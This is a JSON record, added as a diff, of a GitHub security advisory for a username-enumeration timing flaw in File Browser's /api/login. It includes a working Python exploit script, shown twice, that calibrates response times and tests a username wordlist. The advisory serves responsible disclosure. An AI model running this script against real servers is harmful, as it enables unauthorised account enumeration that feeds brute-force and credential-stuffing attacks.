@@ -1,0 +1,108 @@
+{
+  "global": {
+    "cve_id": "CVE-2026-23849",
+    "cvss_severities": {
+      "cvss_v3": {
+        "score": 5.3,
+        "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N"
+      },
+      "cvss_v4": {
+        "score": 0,
+        "vector_string": null
+      }
+    },
+    "cwe_ids": [
+      "CWE-203",
+      "CWE-208"
+    ],
+    "description": "### Summary\nThe JSONAuth.Auth function contains a logic flaw that allows unauthenticated attackers to enumerate valid usernames by measuring the response time of the /api/login endpoint.\n\n### Details\nThe vulnerability exists due to a \"short-circuit\" evaluation in the authentication logic. When a username is not found in the database, the function returns immediately. However, if the username does exist, the code proceeds to verify the password using bcrypt (users.CheckPwd), which is a computationally expensive operation designed to be slow.\n\nThis difference in execution path creates a measurable timing discrepancy:\n\nInvalid User: ~1ms execution (Database lookup only).\nValid User: ~50ms+ execution (Database lookup + Bcrypt hashing).\n\nIn auth/json.go:\n```go\n// auth/json.go line 54\nu, err := usr.Get(srv.Root, cred.Username)\n// VULNERABILITY:\n// If 'err != nil' (User not found), the OR condition short-circuits.\n// The second part (!users.CheckPwd) is NEVER executed.\n//\n// If 'err == nil' (User found), the code MUST execute users.CheckPwd (Bcrypt).\nif err != nil || !users.CheckPwd(cred.Password, u.Password) {\n    return nil, os.ErrPermission\n}\n```\n### PoC\nThe following Python script automates the attack. It first calibrates the network latency using random (non-existent) users to establish a baseline/threshold, and then tests a list of target usernames. Valid users are detected when the response time exceeds the calculated threshold.\n\n```python\nimport requests\nimport time\nimport random\nimport string\nimport statistics\nimport argparse\n\nCALIBRATION_SAMPLES = 20\nENDPOINT = \"/api/login\"\n\ndef generate_random_user(length=10):\n    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))\n\ndef measure_response_time(url, username):\n    start = time.perf_counter()\n    try:\n        requests.post(url, json={\"username\": username, \"password\": \"dummy_pass_123!\"})\n    except Exception as e:\n        print(f\"[!] Connection error: {e}\")\n        return 0\n    return time.perf_counter() - start\n\ndef calibrate(url):\n    print(f\"\\n[*] Calibrating with {CALIBRATION_SAMPLES} random users...\")\n    times = []\n    \n    print(\"    Progress: \", end=\"\", flush=True)\n    for _ in range(CALIBRATION_SAMPLES):\n        random_user = generate_random_user()\n        elapsed = measure_response_time(url, random_user)\n        times.append(elapsed)\n        print(\".\", end=\"\", flush=True)\n    print(\" OK\")\n    \n    mean = statistics.mean(times)\n    try:\n        stdev = statistics.stdev(times)\n    except:\n        stdev = 0.0\n    \n    threshold = mean + (5 * stdev) + 0.005\n    \n    print(f\"    - Mean time (invalid users): {mean:.4f}s\")\n    print(f\"    - Standard deviation: {stdev:.6f}s\")\n    print(f\"    - Threshold set: {threshold:.4f}s\")\n    \n    return threshold\n\ndef load_wordlist(wordlist_path):\n    try:\n        with open(wordlist_path, 'r', encoding='utf-8') as f:\n            users = [line.strip() for line in f if line.strip()]\n        return users\n    except FileNotFoundError:\n        print(f\"[!] Wordlist not found: {wordlist_path}\")\n        exit(1)\n    except Exception as e:\n        print(f\"[!] Error reading wordlist: {e}\")\n        exit(1)\n\ndef timing_attack(url, threshold, users):\n    print(f\"\\n[*] Testing {len(users)} users from wordlist...\")\n    print(\"-\" * 50)\n    print(f\"{'Username':<15} | {'Time':<10} | {'Status'}\")\n    print(\"-\" * 50)\n    \n    found = []\n    \n    for user in users:\n        elapsed = measure_response_time(url, user)\n        \n        if elapsed > threshold:\n            status = \">> VALID <<\"\n            found.append(user)\n        else:\n            status = \"invalid\"\n            \n        print(f\"{user:<15} | {elapsed:.4f}s | {status}\")\n        \n    return found\n\ndef main():\n    parser = argparse.ArgumentParser(description='FileBrowser timing attack exploit')\n    parser.add_argument('-u', '--url', required=True, help='Target URL (e.g., http://localhost:8080)')\n    parser.add_argument('-w', '--wordlist', required=True, help='Path to wordlist file')\n    args = parser.parse_args()\n    \n    target_url = args.url.rstrip('/') + ENDPOINT\n    \n    print(\"=== FILEBROWSER TIMING ATTACK ===\\n\")\n    print(f\"[*] Target: {target_url}\")\n    print(f\"[*] Wordlist: {args.wordlist}\")\n    \n    try:\n        threshold = calibrate(target_url)\n        users = load_wordlist(args.wordlist)\n        print(f\"\\n[*] Loaded {len(users)} users from wordlist\")\n        print(\"[*] Starting attack...\")\n        \n        valid_users = timing_attack(target_url, threshold, users)\n        \n        print(\"\\n\" + \"=\"*50)\n        print(f\"SUMMARY: {len(valid_users)} valid users found\")\n        if valid_users:\n            for u in valid_users:\n                print(f\"  -> {u}\")\n        print(\"=\"*50)\n        \n    except KeyboardInterrupt:\n        print(\"\\n[!] Attack cancelled\")\n\nif __name__ == \"__main__\":\n    main()\n```\n\nFor example, in this case, I have guchihacker as the only valid user in the application.\n<img width=\"842\" height=\"310\" alt=\"image\" src=\"https://github.com/user-attachments/assets/b3caf11e-279c-4532-aa96-fd20cda153a3\" />\n\nI am going to use the exploit to list valid users.\n<img width=\"628\" height=\"716\" alt=\"image\" src=\"https://github.com/user-attachments/assets/f9d93e8e-e773-42a5-8a06-bc6bcc2a71fa\" />\nAs we can see, the user guchihacker has been confirmed as a valid user by comparing the server response time.\n\n### Impact\nAn unauthenticated remote attacker can enumerate valid usernames. This significantly weakens the security posture by facilitating targeted brute-force attacks or credential stuffing against specific, known-valid accounts (e.g., 'admin', 'root', employee names).\n\n\nI remain at your disposal for any questions you may have on this matter. Thank you very much.\n\nSincerely, [Felix Sanchez (GUCHI)](https://guchihacker.github.io/)",
+    "ghsa_id": "GHSA-43mm-m3h2-3prc",
+    "html_url": "https://github.com/advisories/GHSA-43mm-m3h2-3prc",
+    "identifiers": [
+      {
+        "type": "GHSA",
+        "value": "GHSA-43mm-m3h2-3prc"
+      },
+      {
+        "type": "CVE",
+        "value": "CVE-2026-23849"
+      }
+    ],
+    "published_at": "2026-01-21T01:02:17Z",
+    "references": [
+      "https://github.com/filebrowser/filebrowser/security/advisories/GHSA-43mm-m3h2-3prc",
+      "https://nvd.nist.gov/vuln/detail/CVE-2026-23849",
+      "https://github.com/filebrowser/filebrowser/commit/24781badd413ee20333aba5cce1919d676e01889",
+      "https://github.com/advisories/GHSA-43mm-m3h2-3prc"
+    ],
+    "severity": "medium",
+    "summary": "File Browser Vulnerable to Username Enumeration via Timing Attack in /api/login",
+    "updated_at": "2026-02-03T17:22:54Z",
+    "vulnerabilities": [
+      {
+        "first_patched_version": null,
+        "package": {
+          "ecosystem": "go",
+          "name": "github.com/filebrowser/filebrowser"
+        },
+        "vulnerable_version_range": "<= 1.11.0"
+      },
+      {
+        "first_patched_version": "2.55.0",
+        "package": {
+          "ecosystem": "go",
+          "name": "github.com/filebrowser/filebrowser/v2"
+        },
+        "vulnerable_version_range": "< 2.55.0"
+      }
+    ],
+    "withdrawn_at": null
+  },
+  "id": "GHSA-43mm-m3h2-3prc",
+  "repo": {
+    "cve_id": "CVE-2026-23849",
+    "cvss_severities": {
+      "cvss_v3": {
+        "score": 5.3,
+        "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N"
+      },
+      "cvss_v4": {
+        "score": null,
+        "vector_string": null
+      }
+    },
+    "cwe_ids": [
+      "CWE-208"
+    ],
+    "description": "### Summary\r\nThe JSONAuth.Auth function contains a logic flaw that allows unauthenticated attackers to enumerate valid usernames by measuring the response time of the /api/login endpoint.\r\n\r\n### Details\r\nThe vulnerability exists due to a \"short-circuit\" evaluation in the authentication logic. When a username is not found in the database, the function returns immediately. However, if the username does exist, the code proceeds to verify the password using bcrypt (users.CheckPwd), which is a computationally expensive operation designed to be slow.\r\n\r\nThis difference in execution path creates a measurable timing discrepancy:\r\n\r\nInvalid User: ~1ms execution (Database lookup only).\r\nValid User: ~50ms+ execution (Database lookup + Bcrypt hashing).\r\n\r\nIn auth/json.go:\r\n```go\r\n// auth/json.go line 54\r\nu, err := usr.Get(srv.Root, cred.Username)\r\n// VULNERABILITY:\r\n// If 'err != nil' (User not found), the OR condition short-circuits.\r\n// The second part (!users.CheckPwd) is NEVER executed.\r\n//\r\n// If 'err == nil' (User found), the code MUST execute users.CheckPwd (Bcrypt).\r\nif err != nil || !users.CheckPwd(cred.Password, u.Password) {\r\n    return nil, os.ErrPermission\r\n}\r\n```\r\n### PoC\r\nThe following Python script automates the attack. It first calibrates the network latency using random (non-existent) users to establish a baseline/threshold, and then tests a list of target usernames. Valid users are detected when the response time exceeds the calculated threshold.\r\n\r\n```python\r\nimport requests\r\nimport time\r\nimport random\r\nimport string\r\nimport statistics\r\nimport argparse\r\n\r\nCALIBRATION_SAMPLES = 20\r\nENDPOINT = \"/api/login\"\r\n\r\ndef generate_random_user(length=10):\r\n    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))\r\n\r\ndef measure_response_time(url, username):\r\n    start = time.perf_counter()\r\n    try:\r\n        requests.post(url, json={\"username\": username, \"password\": \"dummy_pass_123!\"})\r\n    except Exception as e:\r\n        print(f\"[!] Connection error: {e}\")\r\n        return 0\r\n    return time.perf_counter() - start\r\n\r\ndef calibrate(url):\r\n    print(f\"\\n[*] Calibrating with {CALIBRATION_SAMPLES} random users...\")\r\n    times = []\r\n    \r\n    print(\"    Progress: \", end=\"\", flush=True)\r\n    for _ in range(CALIBRATION_SAMPLES):\r\n        random_user = generate_random_user()\r\n        elapsed = measure_response_time(url, random_user)\r\n        times.append(elapsed)\r\n        print(\".\", end=\"\", flush=True)\r\n    print(\" OK\")\r\n    \r\n    mean = statistics.mean(times)\r\n    try:\r\n        stdev = statistics.stdev(times)\r\n    except:\r\n        stdev = 0.0\r\n    \r\n    threshold = mean + (5 * stdev) + 0.005\r\n    \r\n    print(f\"    - Mean time (invalid users): {mean:.4f}s\")\r\n    print(f\"    - Standard deviation: {stdev:.6f}s\")\r\n    print(f\"    - Threshold set: {threshold:.4f}s\")\r\n    \r\n    return threshold\r\n\r\ndef load_wordlist(wordlist_path):\r\n    try:\r\n        with open(wordlist_path, 'r', encoding='utf-8') as f:\r\n            users = [line.strip() for line in f if line.strip()]\r\n        return users\r\n    except FileNotFoundError:\r\n        print(f\"[!] Wordlist not found: {wordlist_path}\")\r\n        exit(1)\r\n    except Exception as e:\r\n        print(f\"[!] Error reading wordlist: {e}\")\r\n        exit(1)\r\n\r\ndef timing_attack(url, threshold, users):\r\n    print(f\"\\n[*] Testing {len(users)} users from wordlist...\")\r\n    print(\"-\" * 50)\r\n    print(f\"{'Username':<15} | {'Time':<10} | {'Status'}\")\r\n    print(\"-\" * 50)\r\n    \r\n    found = []\r\n    \r\n    for user in users:\r\n        elapsed = measure_response_time(url, user)\r\n        \r\n        if elapsed > threshold:\r\n            status = \">> VALID <<\"\r\n            found.append(user)\r\n        else:\r\n            status = \"invalid\"\r\n            \r\n        print(f\"{user:<15} | {elapsed:.4f}s | {status}\")\r\n        \r\n    return found\r\n\r\ndef main():\r\n    parser = argparse.ArgumentParser(description='FileBrowser timing attack exploit')\r\n    parser.add_argument('-u', '--url', required=True, help='Target URL (e.g., http://localhost:8080)')\r\n    parser.add_argument('-w', '--wordlist', required=True, help='Path to wordlist file')\r\n    args = parser.parse_args()\r\n    \r\n    target_url = args.url.rstrip('/') + ENDPOINT\r\n    \r\n    print(\"=== FILEBROWSER TIMING ATTACK ===\\n\")\r\n    print(f\"[*] Target: {target_url}\")\r\n    print(f\"[*] Wordlist: {args.wordlist}\")\r\n    \r\n    try:\r\n        threshold = calibrate(target_url)\r\n        users = load_wordlist(args.wordlist)\r\n        print(f\"\\n[*] Loaded {len(users)} users from wordlist\")\r\n        print(\"[*] Starting attack...\")\r\n        \r\n        valid_users = timing_attack(target_url, threshold, users)\r\n        \r\n        print(\"\\n\" + \"=\"*50)\r\n        print(f\"SUMMARY: {len(valid_users)} valid users found\")\r\n        if valid_users:\r\n            for u in valid_users:\r\n                print(f\"  -> {u}\")\r\n        print(\"=\"*50)\r\n        \r\n    except KeyboardInterrupt:\r\n        print(\"\\n[!] Attack cancelled\")\r\n\r\nif __name__ == \"__main__\":\r\n    main()\r\n```\r\n\r\nFor example, in this case, I have guchihacker as the only valid user in the application.\r\n<img width=\"842\" height=\"310\" alt=\"image\" src=\"https://github.com/user-attachments/assets/b3caf11e-279c-4532-aa96-fd20cda153a3\" />\r\n\r\nI am going to use the exploit to list valid users.\r\n<img width=\"628\" height=\"716\" alt=\"image\" src=\"https://github.com/user-attachments/assets/f9d93e8e-e773-42a5-8a06-bc6bcc2a71fa\" />\r\nAs we can see, the user guchihacker has been confirmed as a valid user by comparing the server response time.\r\n\r\n### Impact\r\nAn unauthenticated remote attacker can enumerate valid usernames. This significantly weakens the security posture by facilitating targeted brute-force attacks or credential stuffing against specific, known-valid accounts (e.g., 'admin', 'root', employee names).\r\n\r\n\r\nI remain at your disposal for any questions you may have on this matter. Thank you very much.\r\n\r\nSincerely, [Felix Sanchez (GUCHI)](https://guchihacker.github.io/)",
+    "ghsa_id": "GHSA-43mm-m3h2-3prc",
+    "html_url": "https://github.com/filebrowser/filebrowser/security/advisories/GHSA-43mm-m3h2-3prc",
+    "identifiers": [
+      {
+        "type": "GHSA",
+        "value": "GHSA-43mm-m3h2-3prc"
+      },
+      {
+        "type": "CVE",
+        "value": "CVE-2026-23849"
+      }
+    ],
+    "published_at": "2026-01-18T09:35:49Z",
+    "references": [],
+    "severity": "medium",
+    "summary": "Username Enumeration via Timing Attack in /api/login",
+    "updated_at": "2026-01-19T14:43:36Z",
+    "vulnerabilities": [
+      {
+        "package": {
+          "ecosystem": "go",
+          "name": "github.com/filebrowser/filebrowser"
+        },
+        "patched_versions": "2.55.0",
+        "vulnerable_version_range": "< 2.54.0"
+      }
+    ],
+    "withdrawn_at": null
+  },
+  "repository": "filebrowser/filebrowser"
+}
